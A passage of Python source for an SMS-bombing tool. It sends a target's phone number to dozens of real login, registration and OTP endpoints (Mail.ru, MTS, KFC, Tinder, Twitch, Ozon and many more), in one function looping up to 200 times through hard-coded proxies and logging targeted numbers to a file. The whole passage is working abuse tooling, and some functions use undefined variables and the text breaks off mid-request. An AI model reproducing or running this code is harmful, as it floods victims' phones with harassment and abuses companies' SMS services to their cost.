        print('[-] 93 не отправлено!')

    try:
        requests.post('https://kasta.ua/api/v2/login/', data={"phone": _phone})
        print('[+] Kasta отправлено!')
    except:
        print('[-] 94 не отправлено!')

    try:
        requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                      json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email", },
                      proxies={'http': '138.197.137.39:8080'})
        print('[+] Mail.ru отправлено!')
    except:
        print('[-] 95 не отправлено!')

    try:
        requests.post('https://api.creditter.ru/confirm/sms/send',
                      json={"phone": (_phone, "+* (***) ***-**-**"), "type": "register", })
        print('[+] Creditter отправлено!')
    except:
        print('[-] 96 не отправлено!')

    try:
        requests.post('https://win.1admiralxxx.ru/api/en/register.json',
                      json={"mobile": _phone, "bonus": "signup", "agreement": 1, "currency": "RUB", "submit": 1,
                            "email": "", "lang": "en", })
        print('[+] Admiralxxx отправлено!')
    except:
        print('[-] 98 не отправлено!')

    try:
        requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")})
        print('[+] Av отправлено!')
    except:
        print('[-] 99 не отправлено!')

    try:
        requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                      params={"msisdn": _phone})
        print('[+] MTS отправлено!')
    except:
        print('[-] 100 не отправлено!')

    try:
        requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
        print('[+] City24 отправлено!')
    except:
        print('[-] 101 не отправлено!')

    try:
        requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
        print('[+] SushiMaster отправлено!')
    except:
        print('[-] 102 не отправлено!')

    try:
        requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
        print('[+] MultiPlex отправлено!')
    except:
        print('[-] 103 не отправлено!')

    try:
        requests.post('https://www.niyama.ru/ajax/sendSMS.php',
                      data={"REGISTER[PERSONAL_PHONE]": _phone, "code": "", "sendsms": "Выслать код", })
        print('[+] Niyama отправлено!')
    except:
        print('[-] 104 не отправлено!')

    try:
        requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
        print('[+] VSK отправлено!')
    except:
        print('[-] 105 не отправлено!')

    try:
        requests.post('https://msk.tele2.ru/api/validation/number/' + _phone, json={"sender": "Tele2"})
        print('[+] Tele2 отправлено!')
    except:
        print('[-] 109 не отправлено!')

    try:
        requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
        print('[+] Finam отправлено!')
    except:
        print('[-] 110 не отправлено!')

    try:
        requests.post('https://www.flipkart.com/api/6/user/signup/status',
                      headers={"Origin": "https://www.flipkart.com",
                               "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0FKUA/website/41/website/Desktop", },
                      json={"loginId": "+" + _phone, "supportAllStates": True})
        print('[+] FlipKart отправлено!')
    except:
        print('[-] 112 не отправлено!')

    try:
        requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
        print('[+] Online.ua отправлено!')
    except:
        print('[-] 113 не отправлено!')

    try:
        requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
        print('[+] PlanetaKino отправлено!')
    except:
        print('[-] 114 не отправлено!')

    try:
        requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
        print('[+] Iqos отправлено!')
    except:
        print('[-] 116 не отправлено!')

    try:
        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone})
        print('[+] KFC отправлено!')
    except:
        print('[-] 118 не отправлено!')

    try:
        requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php',
                      data={'action': 'ajax_register_user', 'step': '1', 'security_login': '50a8c243f6',
                            'phone': _phone})
        print('[+] tarantino-family отправлено!')
    except:
        print('[-] 119 не отправлено!')

    try:
        requests.post('https://apteka.ru/_action/auth/getForm/',
                      data={"form[NAME]": "", "form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "",
                            "form[EMAIL]": "", "form[LOGIN]": (_phone, "+* (***) ***-**-**"),
                            "form[PASSWORD]": password, "get-new-password": "Получите пароль по SMS",
                            "user_agreement": "on", "personal_data_agreement": "on", "formType": "simple",
                            "utc_offset": "120", })
        print('[+] Apteka отправлено!')
    except:
        print('[-] 120 не отправлено!')

    try:
        requests.post('https://uklon.com.ua/api/v1/account/code/send',
                      headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": _phone})
        print('[+] Uklon отправлено!')
    except:
        print('[-] 121 не отправлено!')

    try:
        requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry', json={"phone": _phone, "otpId": 0})
        print('[+] Ozon отправлен!')
    except:
        print('[-] 122 не отправлено!')

    try:
        requests.get('https://requests.service.banki.ru/form/960/submit',
                     params={"callback": "submitCallback", "name": _name, "phone": "+" + _phone, "email": _email,
                             "gorod": "Москва", "approving_data": "1", })
        print('[+] Banki отправлено!')
    except:
        print('[-] 122 не отправлено!')

    try:
        requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
        print('[+] IVI отправлено!')
    except:
        print('[-] 123 не отправлено!')

    try:
        requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
        print('[+] Helsi отправлено!')
    except:
        print('[+] 125 не отправлено!')

    try:
        requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},
                      json={"Phone": _phone, "Type": 1})
        print('[+] KinoLend отправлен!')
    except:
        print('[-] 126 не отправлено!')

    try:
        requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
        print('[+] Rabota sent!')
    except:
        print('[-] 128 не отправлено!')

    try:
        requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
        print('[+] Rutube sent!')
    except:
        print('[-] 129 не отправлено!')

    try:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
        print('[+] Citilink sent!')
    except:
        print('[-] 130 не отправлено!')

    try:
        requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                      data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
        print('[+] Smsint sent!')
    except:
        print('[-] 131 не отправлено!')

    try:
        requests.get(
            'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
        print('[+] oyorooms sent!')
    except:
        print('[-] 132 не отправлено!')

    try:
        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                      params={"pageName": "registerPrivateUserPhoneVerificatio"},
                      data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "", })
        print('[+] MVIDEO sent!')
    except:
        print('[-] 133 не отправлено!')

    try:
        requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
            'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}},
                                                          'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
        print('[+] newnext sent!')
    except:
        print('[-] 134 не отправлено!')

    try:
        requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
        print('[+] Sunlight sent!')
    except:
        print('[-] 135 не отправлено!')

    try:
        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                      json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone,
                            'deliveryOption': 'sms'})
        print('[+] alpari sent!')
    except:
        print('[-] 136 не отправлено!')

    try:
        requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
        print('[+] Invitro sent!')
    except:
        print('[-] 137 не отправлено!')

    try:
        requests.post('https://online.sbis.ru/reg/service/',
                      json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                            'params': {'phone': _phone}, 'id': '1'})
        print('[+] Sberbank sent!')
    except:
        print('[-] 138 не отправлено!')

    try:
        requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
                      json={'firstName': 'Иван', 'middleName': 'Иванович', 'lastName': 'Иванов', 'sex': '1',
                            'birthDate': '10.10.2000', 'mobilePhone': _phone9, 'russianFederationResident': 'true',
                            'isDSA': 'false', 'personalDataProcessingAgreement': 'true', 'bKIRequestAgreement': 'null',
                            'promotionAgreement': 'true'})
        print('[+] Psbank sent!')
    except:
        print('[-] 139 не отправлено!')

    try:
        requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
        print('[+] Beltelcom sent!')
    except:
        print('[-] 140 не отправлено!')

    try:
        requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
        print('[+] Karusel sent!')
    except:
        print('[-] 141 не отправлено!')

    try:
        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
        print('[+] KFC sent!')
    except:
        print('[-] 142 не отправлено!')

    try:
        requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
        print('[+] Yandex.Chef sent!')
    except:
        print('[-] 143 не отправлено!')

    try:
        requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                      params={"msisdn": _phone})
        print('[+] MTS отправлено!')
    except:
        print('[-] 144 не отправлено!')

    try:
        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                      data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                            "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
        print('[+] ICQ sent!')
    except:
        print('[-] 148 не отправлено!')

    try:
        requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                      data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown", "stream_id": 0,
                            "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
        print('[+] InDriver sent!')
    except:
        print('[-] 149 не отправлено!')

    try:
        requests.post('https://lk.invitro.ru/sp/mobileApi/createUserByPassword',
                      data={"password": password, "application": "lkp", "login": "+" + _phone})
        print('[+] Invitro отправлено!')
    except:
        print('[-] 150 не отправлено!')

    try:
        requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
        print('[+] Pmsm sent!')
    except:
        print('[-] 151 не отправлено!')

    try:
        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
        print('[+] IVI sent!')
    except:
        print('[-] 152 не отправлено!')

    try:
        requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
        print('[+] Lenta sent!')
    except:
        print('[-] 153 не отправлено!')

    try:
        requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                      json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
        print('[+] Mail.ru sent!')
    except:
        print('[-] 154 не отправлено!')

    try:
        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                      params={"pageName": "registerPrivateUserPhoneVerificatio"},
                      data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
        print('[+] MVideo sent!')
    except:
        print('[-] 155 не отправлено!')

    try:
        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                      data={"st.r.phone": "+" + _phone})
        print('[+] OK sent!')
    except:
        print('[-] 156 не отправлено!')

    try:
        requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
        print('[+] SMSgorod sent!')
    except:
        print('[-] 158 не отправлено!')

    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                      data={'phone_number': _phone})
        print('[+] Tinder sent!')
    except:
        print('[-] 160 не отправлено!')

    try:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',
                      json={"birthday": {"day": 11, "month": 11, "year": 1999},
                            "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                            "password": password, "phone_number": _phone, "username": username})
        print('[+] Twitch sent!')
    except:
        print('[-] 161 не отправлено!')

    try:
        requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
                      headers={'App-ID': 'cabinet'})
        print('[+] CabWiFi sent!')
    except:
        print('[-] 162 не отправлено!')

    try:
        requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
        print('[+] wowworks sent!')
    except:
        print('[-] 163 не отправлено!')

    try:
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
        print('[+] Youla sent!')
    except:
        print('[-] 165 не отправлено!')

    try:
        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                      json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
                            "deliveryOption": "sms"})
        print('[+] Alpari sent!')
    except:
        print('[-] 166 не отправлено!')

    try:
        requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
        print('[+] SMS sent!')
    except:
        print('[-] 167 не отправлено!')

    try:
        requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
        print('[+] Delivery sent!')
    except:
        print('[-] 168 не отправлено!')
    
def send_for_number1(phone): 
    _name = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    iteration = 0
    _email = _name + f'{iteration}' + '@gmail.com'
    email = _name + f'{iteration}' + '@gmail.com'
    _phone = '380930658455'
    _phoneNEW = phone[3:]
    _phone = phone
    _phone9 = _phone[1:]
    _phoneAresBank = '+' + _phone[0] + '(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[
                                                                                                         9:11]  # +7+(915)350-99-08
    _phone9dostavista = _phone9[:3] + '+' + _phone9[3:6] + '-' + _phone9[6:8] + '-' + _phone9[8:10]  # 915+350-99-08
    _phoneOstin = '+' + _phone[0] + '+(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[
                                                                                                       9:11]  # '+7+(915)350-99-08'
    _phonePizzahut = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + ' ' + _phone[7:9] + ' ' + _phone[
                                                                                                           9:11]  # '+7 (915) 350 99 08'
    _phoneGorzdrav = _phone[1:4] + ') ' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]  # '915) 350-99-08'
    _phonePozichka = '+' + _phone[0:2] + '-' + _phone[2:5] + '-' + _phone[5:8] + '-' + _phone[8:10] + '-' + _phone[
                                                                                                            10:12]  # 38-050-669-16-10'
    _phoneQ = '+' + _phone[0:2] + '(' + _phone[2:5] + ') ' + _phone[5:8] + ' ' + _phone[8:10] + ' ' + _phone[
                                                                                                      10:12]  # +38(050) 669 16 10
    _phoneCitrus = '+' + _phone[0:3] + ' ' + _phone[3:5] + '-' + _phone[5:8] + ' ' + _phone[8:10] + ' ' + _phone[10:12]
    _phoneComfy = '+' + _phone[0:2] + ' (' + _phone[2:5] + ') ' + _phone[5:8] + '-' + _phone[8:10] + '-' + _phone[10:12]
    _phone88 = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + ' ' + _phone[7:9] + '-' + _phone[9:11]
    _phone585 = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[
                                                                                                      9:11]  # +7 (925) 350-99-01
    request_timeout = 0.01
    
    try:
        requests.get(f'https://otaxi.com.ua/api/call/otp?phone={num}&lang=ru',
                headers={"Accept": "application/json", "x-ot-app-id": "cE59691D368c2083K46d",
                         "Content-Type": "application/json; charset=utf-8", "Host": "otaxi.com.ua",
                         "Connection": "Keep-Alive", "Accept-Encoding": "gzip", "User-Agent": "okhttp/3.12.0"})
    except:
        print('@artem450 сабака которая дала не тот сайт')

    
    
def send_for_number2(phone): 
    _name = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    iteration = 0
    _email = _name + f'{iteration}' + '@gmail.com'
    email = _name + f'{iteration}' + '@gmail.com'
    _phone = '380930658455'
    _phoneNEW = phone[3:]
    _phone = phone
    _phone9 = _phone[1:]
    _phoneAresBank = '+' + _phone[0] + '(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[
                                                                                                         9:11]  # +7+(915)350-99-08
    _phone9dostavista = _phone9[:3] + '+' + _phone9[3:6] + '-' + _phone9[6:8] + '-' + _phone9[8:10]  # 915+350-99-08
    _phoneOstin = '+' + _phone[0] + '+(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[
                                                                                                       9:11]  # '+7+(915)350-99-08'
    _phonePizzahut = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + ' ' + _phone[7:9] + ' ' + _phone[
                                                                                                           9:11]  # '+7 (915) 350 99 08'
    _phoneGorzdrav = _phone[1:4] + ') ' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]  # '915) 350-99-08'
    _phonePozichka = '+' + _phone[0:2] + '-' + _phone[2:5] + '-' + _phone[5:8] + '-' + _phone[8:10] + '-' + _phone[
                                                                                                            10:12]  # 38-050-669-16-10'
    _phoneQ = '+' + _phone[0:2] + '(' + _phone[2:5] + ') ' + _phone[5:8] + ' ' + _phone[8:10] + ' ' + _phone[
                                                                                                      10:12]  # +38(050) 669 16 10
    _phoneCitrus = '+' + _phone[0:3] + ' ' + _phone[3:5] + '-' + _phone[5:8] + ' ' + _phone[8:10] + ' ' + _phone[10:12]
    _phoneComfy = '+' + _phone[0:2] + ' (' + _phone[2:5] + ') ' + _phone[5:8] + '-' + _phone[8:10] + '-' + _phone[10:12]
    _phone88 = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + ' ' + _phone[7:9] + '-' + _phone[9:11]
    _phone585 = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[
                                                                                                      9:11]  # +7 (925) 350-99-01
    request_timeout = 0.01
    

    try:
        requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': number_7}, headers=HEADERS)
    except:
        pass

    try:
        requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": number_7},
                      headers=HEADERS)
    except:
        pass

    try:
        requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                      json={"phone": number_plus7, "api": 2, "email": "email", "x-email": "x-email"}, headers=HEADERS)
    except:
        pass

    try:
        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': number_plus7},
                      headers=HEADERS)
    except:
        pass

    try:
        requests.post('https://b.utair.ru/api/v1/login/', data={'login': number_8}, headers=HEADERS)
    except:
        pass

    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                               data={"phone_number": number_7}, headers=HEADERS)
    except:
        pass

    try:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + number_7 + '/', headers=HEADERS)
    except:
        pass

    try:
        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                           data={"st.r.phone": number_plus7}, headers=HEADERS)
    except:
        pass

    try:
        requests.post('https://app.karusel.ru/api/v1/phone/', data={"phone": number_7}, headers=HEADERS)
    except:
        pass

    try:
        requests.post('https://youdrive.today/login/web/phone', data={'phone': number, 'phone_code': '7'},
                                 headers=HEADERS)  # headers = {}, headers=HEADERS)
    except:
        pass

    try:
        requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': number_7}, headers=HEADERS)
    except:
        pass

    try:
        requests.post('https://youla.ru/web-api/auth/request_code', json={"phone": number_plus7}, headers=HEADERS)
    except:
        pass

    try:
        requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                            json={"phone_number": "+" + number_7}, headers=HEADERS)
    except:
        pass

    try:
        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": number_7},
                            headers=HEADERS)
    except:
        pass

    try:
        requests.post("https://api.delitime.ru/api/v2/signup",
                                   data={"SignupForm[username]": number_7, "SignupForm[device_type]": 3}, headers=HEADERS)
    except:
        pass

    try:
        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                            data={'msisdn': number_7, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                  "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, headers=HEADERS)
    except:
        pass

    try:
        requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
        print('[+] MTS sent!')
    except:
        print('[-] 91 не отправлено!')

    try:
        requests.post("https://eda.yandex/api/v1/user/request_authentication_code",
                      json={"phone_number": "+" + _phone})
        print("+")
    except:
        print("- 1")

    try:
        requests.post("https://msk.tele2.ru/api/validation/number/" + _phone,
                      json={"sender": "Tele2"})
        print("+")
    except:
        print("- 3")

    try:
        requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",
                      data={
                          "msisdn": _phone,
                          "locale": "en",
                          "countryCode": "ru",
                          "version": "1",
                          "k": "ic1rtwz1s1Hj1O0r",
                          "r": "46763",
                      },
                      )
        print("+")
    except:
        print("- 4")

    try:
        requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",
                      params={"msisdn": _phone})
        print("+")
    except:
        print("- 5")

    try:
        requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/",
                      json={"phone": "+" + _phone})
        print("+")
    except:
        print("- 6")

    try:
        requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
        print('[+] IVI отправлено!')
    except:
        print('[-] 123 не отправлено!')

    try:
        requests.post("https://moneyman.ru/registration_api/actions/send-confirmation-code",
                      data="+" + _phone, )
        print("[+] MoneyMan отправлено!")
    except:
        print("[-] 18 не отправлено!")

    try:
        requests.post("https://api.cian.ru/sms/v1/send-validation-code/",
                      json={"phone": "+" + _phone, "type": "authenticateCode"})
        print("[-] Cian отправлено!")
    except:
        print("[-] 13 не отправлено!")

    try:
        requests.post("https://nn-card.ru/api/1.0/covid/login", json={"phone": _phone})
        print("[+] NNcard отправлен!")
    except:
        print("[-] 20 не отправлено!")

    try:
        requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
        print('[+] Iqos отправлено!')
    except:
        print('[-] 116 не отправлено!')

    try:
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
        print('[+] Youla sent!')
    except:
        print('[-] 165 не отправлено!')

    try:
        requests.post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",data={"phone": _phone585},
                      )
        print('[+] Pliskov отправлено!')
    except:
        print('[-] 46 не отправлено!')

    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone}, headers={})
        print('[+] Tinder sent!')
    except:
        print('[-] 79 не отправлено!')

    try:
        requests.post("https://friendsclub.ru/assets/components/pl/connector.php",data={"casePar": "authSendsms", "MobilePhone": "+" + _phone})
        print('[+] FriendClub отправлено!')
    except:
        print('[-] 53 не отправлено!')

    try:
        requests.post('https://apteka.ru/_action/auth/getForm/',
                      data={"form[NAME]": "", "form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "",
                            "form[EMAIL]": "", "form[LOGIN]": (_phone, "+* (***) ***-**-**"),
                            "form[PASSWORD]": password, "get-new-password": "Получите пароль по SMS",
                            "user_agreement": "on", "personal_data_agreement": "on", "formType": "simple",
                            "utc_offset": "120", })
        print('[+] Apteka отправлено!')
    except:
        print('[-] 120 не отправлено!')

    try:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
        print('[+] Citilink sent!')
    except:
        print('[-] 130 не отправлено!')

def spamvip2(id1, nomer):
        sms1vip11=0
        print(id1)
        print(nomer)
        tell = nomer
        tel = nomer[1:]
        sms = 0
        sms1vip11 = 0
        f = open('numWL.txt', 'a')
        f.write(str(nomer) + '\n')
        f.close()
        proxies = {'http': 'http://162.244.35.50:2332',
                   'http': 'http://183.129.207.80:3178',
                   'http':'http://188.32.48.236:8081',
                   'http': 'http://77.89.233.54:8080',
                   'http': 'http://46.101.113.185:80',}
        while sms1vip11 <=200:
            try:
                headers = {'content-type': 'application/x-www-form-urlencoded',
                           'Content-Length': '469',
                           'Host': 'auth.etaxi.ua',
                           'Connection': 'Keep-Alive'}
                data = {
                    'request': '{"id":10,"pm":{"afs":"07","fccs":false,"did":"ffffffff-bb77-407f-ec2c-02ec0033c587","dtp":"a","lcl":"uk","cph":"' + str(
                        nomer) + '","psl":"","pvr":"79"},"rq":"signUp"}',
                    'deviceConnectionId': 'fE5oDi-6CKc:APA91bFX-F5ErzwjiUTWLcgCLyMcilIFoPaV64LTVMYDT8tXaz4VW0SDra2geyOJjgRxRpo3zmaxzL_5cGLf5Cf8RiBZ6oKivR8H9usWfxUOS_j-9mTF9HA6fxvg69FLVNKTGDfD1GKi'}
                s = requests.Session()
                r = s.post('https://auth.etaxi.ua/clientapp/request/signUp', data=data, headers=headers)
                time.sleep(1)
                sms1vip11 += 1
            except:
                pass
            try:
                headers = {'Accept': 'application/json',
                           'Content-Type': 'application/json; charset=utf-8',
                           'x-ot-app-id': 'cE59691D368c2083K46d',
                           'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G532F Build/MMB29T)',
                           'Host': 'otaxi.com.ua',
                           'Connection': 'Keep-Alive',
                           'Accept-Encoding': 'gzip',
                           'Content-Length': '216'}
                data = '{"phone":"' + nomer[
                                      1:] + '","gcm_token":"f0uewn4Fhwg:APA91bF6vmJqN4xMNHGfPzSWYAPkQWe43pqqI6Fb0NjUHNZZx4UIUQ6rYnfKJL3fq4QyBWVVmAizyLuPrzTjrQEHiWhZnE49u2vTAxEPt-ORzDF4OevsEzFNvvJXVNT-SD-7TQ4WtWOJ","os":"aos","locale":"uk"}'
                s = requests.Session()
                s.post('https://otaxi.com.ua/api/user/getpassword', data=data, headers=headers)
                time.sleep(1)
                sms1vip11 += 1
            except:
                pass
            try:
                a = random.randint(11111111111, 99999999999)
                q = tel[1:4]
                x = tel[7:9]
                w = tel[9:11]
                c = tel[4:7]
                time.sleep(1)
                r = requests.post('https://drugvokrug.ru/siteActions/processSms.htm',
                                  proxies=proxies,
                                  data={'cell': tel},
                                  headers={
                                      'Accept-Language': 'en-US,en;q=0.5',
                                      'Connection': 'keep-alive',
                                      'Host': 'drugvokrug.ru',
                                      'origin': 'https://drugvokrug.ru',
                                      'Referer': 'https://drugvokrug.ru/'})
                time.sleep(1)
                sms1vip11 += 1
            except:
                pass
            try:
                r = requests.post('https://www.delivery-club.ru/ajax/user_otp/',
                                  data={'phone': tel},
                                  headers={
                                      'Accept-Language': 'ru-RU',
                                      'Cache-Control': 'no-cache',
                                      'Host': 'www.delivery-club.ru',
                                      'origin': 'https://www.delivery-club.ru',
                                      'Referer': 'https://www.delivery-club.ru/'})
                time.sleep(1)
                sms1vip11 += 1
            except:
                pass
            try:
                r = requests.post('https://api.sunlight.net/v3/customers/authorization/',
                                  proxies=proxies,
                                  data={'phone': tel},
                                  headers={
                                      'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6',
                                      'Connection': 'keep-alive',
                                      'Host': 'sunlight.net',
                                      'origin': 'https://sunlight.net',
                                      'Referer': 'https://sunlight.net/profile/login/?next=/profile/'})
                time.sleep(1)
                sms1vip11 += 1
            except:
                pass
            try:
                r = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                                  data={'phoneNumber': tel,
                                        'countryCode': 'ID',
                                        'name': 'test',
                                        'email': 'mail@mail.com',
                                        'deviceToken': '*'},
                                  headers={
                                      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
                time.sleep(1)
                sms1vip11 += 1
            except:
                pass
            try:
                r = requests.post('https://b.utair.ru/api/v1/login/',
                                  proxies=proxies,
                                  data={'login': tel},
                                  headers={
                                      'Accept-Language': 'en-US,en;q=0.5',
                                      'Connection': 'keep-alive',
                                      'Host': 'b.utair.ru',
                                      'origin': 'https://www.utair.ru',
                                      'Referer': 'https://www.utair.ru/'})
                time.sleep(1)
                sms1vip11 += 1
            except:
                pass
            try:
                r = requests.post('https://belkacar.ru/get-confirmation-code',
                                  proxies=proxies,
                                  data={'phone': tel},
                                  headers={
                                      'Accept-Language': 'en-US,en;q=0.5',
                                      'Connection': 'keep-alive',
                                      'Host': 'belkacar.ru',
                                      'origin': 'https://belkacar.ru/',
                                      'Referer': 'https://belkacar.ru/'})
                time.sleep(1)
                sms1vip11 += 1
            except:
                pass
            try:
                r = requests.post(
